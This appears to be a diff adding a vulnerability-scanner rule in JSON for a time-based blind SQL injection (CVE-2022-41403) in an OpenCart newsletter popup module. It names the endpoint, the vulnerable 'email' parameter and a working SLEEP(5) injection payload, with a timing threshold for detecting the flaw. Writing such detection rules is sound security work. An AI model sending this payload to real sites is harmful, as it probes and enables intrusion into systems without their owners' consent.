@@ -1,0 +1,17 @@
+{
+ "id": "opencart-so-newsletter",
+ "engine": "opencart",
+ "path": "/index.php?route=extension/module/so_newletter_custom_popup/newsletter",
+ "param": "email",
+ "payloads": [
+  "a",
+  "a' AND (SELECT SLEEP(5)) AND '1'='1"
+ ],
+ "match": {
+  "type": "time",
+  "value": 4
+ },
+ "score": 7,
+ "note": "CVE-2022-41403, слепая по времени",
+ "method": "GET"
+}
